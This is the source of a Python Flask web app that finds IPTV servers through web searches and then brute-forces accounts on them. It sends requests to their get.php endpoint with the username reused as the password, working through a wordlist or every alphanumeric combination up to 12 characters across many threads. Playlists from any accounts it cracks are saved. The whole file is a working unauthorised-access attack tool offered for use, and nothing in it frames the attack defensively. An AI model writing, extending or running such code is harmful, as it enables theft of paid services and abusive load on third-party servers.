import os
import random
import threading
import logging
import time
import string
import itertools
import shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_cors import CORS
import Crawler

# Configure standard Python logger for Docker/Portainer stdout logs
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s in %(module)s: %(message)s'
)
logger = logging.getLogger("IPTV")

app = Flask(__name__)
CORS(app)

crawler = Crawler.Crawler("en")

found_accounts_list = []

scan_state = {
    "is_scanning": False,
    "cancel_requested": False,
    "progress": 0,
    "total": 0,
    "current_url": "",
    "status_message": "Idle",
    "found_accounts": 0,
    "eta_seconds": 0,
    "elapsed_seconds": 0,
    "attack_mode": "dictionary",
    "concurrency": 16,
    "logs": []
}

def log_event(message, to_console=False):
    scan_state["logs"].append(message)
    if len(scan_state["logs"]) > 200:
        scan_state["logs"].pop(0)
    if to_console:
        logger.info(message)

def generate_alphanumeric_generator(min_len=1, max_len=12):
    """Continuous generator for 1 to 12 character alphanumeric & special character combinations"""
    chars = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
    for length in range(min_len, max_len + 1):
        for combo in itertools.product(chars, repeat=length):
            yield "".join(combo)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/status", methods=["GET"])
def get_status():
    return jsonify({
        "version": crawler.version,
        "language": crawler.language,
        "parsed_urls": crawler.parsedUrls,
        "scan_state": scan_state,
        "found_accounts_list": found_accounts_list
    })

@app.route("/api/save-servers", methods=["POST"])
def save_servers():
    success = crawler.save_servers_to_disk()
    if success:
        return jsonify({"success": True, "message": "Servers list saved to disk successfully."})
    return jsonify({"success": False, "message": "Failed to save servers to disk."}), 500

@app.route("/api/remove-url", methods=["POST"])
def remove_url():
    data = request.json or {}
    url = data.get("url", "").strip()
    if crawler.remove_server_url(url):
        log_event(f"Removed server URL: {url}", to_console=True)
        return jsonify({"success": True, "parsed_urls": crawler.parsedUrls})
    return jsonify({"success": False, "message": "Server URL not found"}), 400

@app.route("/api/add-url", methods=["POST"])
def add_url():
    data = request.json or {}
    text_content = data.get("url", "").strip()
    added_count = crawler.add_custom_urls(text_content)
    if added_count > 0:
        log_event(f"Added {added_count} target server URL(s)", to_console=True)
        return jsonify({"success": True, "message": f"Added {added_count} URL(s)", "parsed_urls": crawler.parsedUrls})
    return jsonify({"success": False, "message": "No valid or new server URLs found"}), 400

@app.route("/api/upload-server-list", methods=["POST"])
def upload_server_list():
    if 'file' not in request.files:
        return jsonify({"success": False, "message": "No file uploaded"}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({"success": False, "message": "Empty file name"}), 400
    
    try:
        content = file.read().decode('utf-8', errors='ignore')
        added_count = crawler.add_custom_urls(content)
        log_event(f"Uploaded server list file '{file.filename}'. Added {added_count} new server(s).", to_console=True)
        return jsonify({"success": True, "added_count": added_count, "parsed_urls": crawler.parsedUrls})
    except Exception as e:
        return jsonify({"success": False, "message": f"Failed to parse file: {e}"}), 500

@app.route("/api/search-links", methods=["POST"])
def search_links():
    data = request.json or {}
    query = data.get("query", "").strip() or None

    def do_search():
        msg = "Searching web for IPTV server URLs..."
        scan_state["status_message"] = msg
        log_event(msg, to_console=True)
        found = crawler.search_links(query)
        msg_complete = f"Search complete. Discovered {found} new servers. Total available: {len(crawler.parsedUrls)}"
        scan_state["status_message"] = msg_complete
        log_event(msg_complete, to_console=True)

    thread = threading.Thread(target=do_search)
    thread.start()
    return jsonify({"status": "Search started"})

@app.route("/api/cancel-scan", methods=["POST"])
def cancel_scan():
    if not scan_state["is_scanning"]:
        return jsonify({"message": "No scan is currently running."})
    scan_state["cancel_requested"] = True
    msg = "Cancellation requested by user. Stopping attack..."
    scan_state["status_message"] = msg
    log_event(msg, to_console=True)
    return jsonify({"status": "Cancellation requested"})

@app.route("/api/scan", methods=["POST"])
def start_scan():
    if scan_state["is_scanning"]:
        return jsonify({"error": "Scan already in progress"}), 400

    data = request.json or {}
    target_url = data.get("url")
    attack_all = data.get("attack_all", False)
    charset_mode = data.get("mode", "dictionary")
    max_len = data.get("max_length", 12)
    threads_count = int(data.get("threads", os.cpu_count() * 4 if os.cpu_count() else 16))

    def check_username(server, username, headers):
        if scan_state["cancel_requested"]:
            return None
        target_endpoint = server + crawler.basicString % (username, username)
        import requests
        try:
            res = requests.get(target_endpoint, headers=headers, timeout=4)
            if res.status_code == 200 and len(res.text) > 0 and "#EXTM3U" in res.text:
                return (username, res.text)
        except Exception:
            pass
        return None

    def run_scan():
        scan_state["is_scanning"] = True
        scan_state["cancel_requested"] = False
        scan_state["progress"] = 0
        scan_state["found_accounts"] = 0
        scan_state["eta_seconds"] = 0
        scan_state["elapsed_seconds"] = 0
        scan_state["attack_mode"] = charset_mode
        scan_state["concurrency"] = threads_count
        
        targets = []
        if attack_all:
            targets = list(crawler.parsedUrls)
        elif target_url:
            targets = [target_url]
        elif crawler.parsedUrls:
            targets = [random.choice(crawler.parsedUrls)]

        if not targets:
            scan_state["is_scanning"] = False
            msg = "No target server URLs available. Run search or add a server URL."
            scan_state["status_message"] = msg
            log_event(msg, to_console=True)
            return

        headers = {'User-Agent': 'Mozilla/5.0'}
        log_event(f"Multi-core execution initialized: {threads_count} parallel threads (CPU cores: {os.cpu_count() or 'N/A'})", to_console=True)

        for server in targets:
            if scan_state["cancel_requested"]:
                break

            scan_state["current_url"] = server
            msg_start = f"Starting multi-threaded attack on target: {server} [{threads_count} threads]"
            scan_state["status_message"] = f"Attacking {server} ({threads_count} threads)..."
            log_event(msg_start, to_console=True)

            found = 0
            start_time = time.time()

            if charset_mode == "alphanumeric":
                log_event(f"Using Alphanumeric & Special Chars streaming brute force (Up to {max_len} chars)...", to_console=True)
                gen = generate_alphanumeric_generator(min_len=1, max_len=max_len)
                total_estimated = 1000000
                scan_state["total"] = total_estimated
                processed_count = 0

                batch_size = threads_count * 100
                executor = ThreadPoolExecutor(max_workers=threads_count)

                try:
                    while not scan_state["cancel_requested"]:
                        batch = []
                        for _ in range(batch_size):
                            try:
                                batch.append(next(gen))
                            except StopIteration:
                                break

                        if not batch:
                            break

                        future_to_username = {executor.submit(check_username, server, uname, headers): uname for uname in batch}
                        for future in as_completed(future_to_username):
                            if scan_state["cancel_requested"]:
                                break

                            processed_count += 1
                            scan_state["progress"] = processed_count
                            elapsed = time.time() - start_time
                            scan_state["elapsed_seconds"] = int(elapsed)
                            if processed_count > 1:
                                avg_time_per_item = elapsed / processed_count
                                remaining_items = max(0, total_estimated - processed_count)
                                scan_state["eta_seconds"] = int(avg_time_per_item * remaining_items)

                            username = future_to_username[future]
                            log_event(f"request for name: {username}", to_console=False)
                            
                            if processed_count % 100 == 0:
                                logger.info(f"Streaming progress on {server}: {processed_count} combinations tried - Accounts found: {found}")

                            try:
                                result = future.result()
                                if result:
                                    found_uname, fetched_text = result
                                    domain = server.replace("http://", "").replace("https://", "").strip("/")
                                    new_path = os.path.join(crawler.outputDir, domain)
                                    crawler.create_file(found_uname, new_path, fetched_text)
                                    found += 1
                                    scan_state["found_accounts"] += 1
                                    
                                    m3u_file_path = os.path.join(domain, f"tv_channels_{found_uname}.m3u").replace("\\", "/")
                                    playlist_url = f"{server}/get.php?username={found_uname}&password={found_uname}&type=m3u&output=mpegts"
                                    
                                    account_data = {
                                        "server": server,
                                        "username": found_uname,
                                        "password": found_uname,
                                        "file_path": m3u_file_path,
                                        "playlist_url": playlist_url
                                    }
                                    found_accounts_list.append(account_data)

                                    msg_found = f"ACCOUNT FOUND !!! -> Username: '{found_uname}' | Password: '{found_uname}' | Server: '{server}' | Saved file: '{m3u_file_path}'"
                                    log_event(msg_found, to_console=True)
                            except Exception:
                                pass
                finally:
                    executor.shutdown(wait=False)

            else: # Dictionary mode
                lang_file = os.path.join(crawler.languageDir, "en.txt")
                if not os.path.exists(lang_file):
                    log_event("Error: English wordlist missing.", to_console=True)
                    continue
                with open(lang_file, "r", encoding="utf-8", errors="ignore") as f:
                    word_list = [line.strip() for line in f if line.strip()]
                
                total_lines = len(word_list)
                scan_state["total"] = total_lines

                with ThreadPoolExecutor(max_workers=threads_count) as executor:
                    future_to_username = {executor.submit(check_username, server, uname, headers): uname for uname in word_list}
                    
                    for idx, future in enumerate(as_completed(future_to_username), start=1):
                        if scan_state["cancel_requested"]:
                            log_event(f"Attack cancelled on {server}.", to_console=True)
                            executor.shutdown(wait=False)
                            break

                        username = future_to_username[future]
                        scan_state["progress"] = idx
                        elapsed = time.time() - start_time
                        scan_state["elapsed_seconds"] = int(elapsed)
                        if idx > 1:
                            avg_time_per_item = elapsed / idx
                            remaining_items = total_lines - idx
                            scan_state["eta_seconds"] = int(avg_time_per_item * remaining_items)

                        log_event(f"request for name: {username}", to_console=False)
                        
                        if idx % 100 == 0 or idx == total_lines:
                            logger.info(f"Parallel progress on {server}: {idx}/{total_lines} ({round((idx/total_lines)*100)}%) - Accounts found: {found} - ETA: {scan_state['eta_seconds']}s")

                        try:
                            result = future.result()
                            if result:
                                found_uname, fetched_text = result
                                domain = server.replace("http://", "").replace("https://", "").strip("/")
                                new_path = os.path.join(crawler.outputDir, domain)
                                crawler.create_file(found_uname, new_path, fetched_text)
                                found += 1
                                scan_state["found_accounts"] += 1
                                
                                m3u_file_path = os.path.join(domain, f"tv_channels_{found_uname}.m3u").replace("\\", "/")
                                playlist_url = f"{server}/get.php?username={found_uname}&password={found_uname}&type=m3u&output=mpegts"
                                
                                account_data = {
                                    "server": server,
                                    "username": found_uname,
                                    "password": found_uname,
                                    "file_path": m3u_file_path,
                                    "playlist_url": playlist_url
                                }
                                found_accounts_list.append(account_data)

                                msg_found = f"ACCOUNT FOUND !!! -> Username: '{found_uname}' | Password: '{found_uname}' | Server: '{server}' | Saved file: '{m3u_file_path}'"
                                log_event(msg_found, to_console=True)
                        except Exception:
                            pass

        was_cancelled = scan_state["cancel_requested"]
        scan_state["is_scanning"] = False
        scan_state["cancel_requested"] = False
        scan_state["eta_seconds"] = 0
        
        msg_final = "Attack stopped by user." if was_cancelled else "All target attacks completed."
        scan_state["status_message"] = msg_final
        log_event(msg_final, to_console=True)

    thread = threading.Thread(target=run_scan)
    thread.start()
    return jsonify({"status": "Scan started"})

@app.route("/api/outputs", methods=["GET"])
def list_outputs():
    outputs = []
    out_dir = crawler.outputDir
    if os.path.exists(out_dir):
        for root, dirs, files in os.walk(out_dir):
            for file in files:
                if file.endswith(".m3u"):
                    rel_path = os.path.relpath(os.path.join(root, file), out_dir)
                    outputs.append({
                        "filename": file,
                        "path": rel_path.replace("\\", "/")
                    })
    return jsonify({"files": outputs})

@app.route("/api/delete-output/<path:filepath>", methods=["POST", "DELETE"])
def delete_output(filepath):
    try:
        full_path = os.path.abspath(os.path.join(crawler.outputDir, filepath))
        if not full_path.startswith(os.path.abspath(crawler.outputDir)):
            return jsonify({"success": False, "message": "Invalid file path"}), 400

        if os.path.exists(full_path) and os.path.isfile(full_path):
            os.remove(full_path)
            
            norm_path = filepath.replace("\\", "/")
            global found_accounts_list
            found_accounts_list = [acc for acc in found_accounts_list if acc.get("file_path", "").replace("\\", "/") != norm_path]

            parent_dir = os.path.dirname(full_path)
            if os.path.exists(parent_dir) and not os.listdir(parent_dir):
                shutil.rmtree(parent_dir, ignore_errors=True)

            log_event(f"Deleted playlist file: {filepath}", to_console=True)
            return jsonify({"success": True, "message": f"Deleted {filepath}"})
        return jsonify({"success": False, "message": "File not found"}), 404
    except Exception as e:
        return jsonify({"success": False, "message": f"Error deleting file: {e}"}), 500

@app.route("/api/download/<path:filepath>")
def download_file(filepath):
    return send_from_directory(crawler.outputDir, filepath, as_attachment=True)

def main():
    logger.info("Starting IPTV Web Server on port 5000...")
    app.run(host="0.0.0.0", port=5000, debug=False)

if __name__ == "__main__":
    main()
else:
    main()
